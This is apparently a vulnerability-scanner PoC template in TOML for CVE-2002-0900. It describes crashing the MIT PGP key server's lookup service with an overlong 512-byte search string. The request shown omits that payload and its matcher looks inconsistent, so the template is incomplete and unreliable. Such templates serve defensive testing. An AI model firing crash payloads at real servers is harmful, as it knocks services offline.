[info]
author = "ave"
description = "向 pks PGP 公钥 Web 服务器（默认端口 11371）的 lookup 功能发送超长搜索参数，触发缓冲区溢出导致服务崩溃。验证方式：发送 512 字节 'A' 作为搜索字符串，观察服务是否无响应或断开连接。"
id = "POC-AVE-2002-0467"
name = "MIT PGP Public Key Server 搜索字符串远程缓冲区溢出 PoC"
severity = "high"
tags = ["ave-2002-0467"]
vuln_id = [
    "CVE-2002-0900",
    "AVE-2002-0467",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/pks/lookup?op=index&"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["Connection: close"]
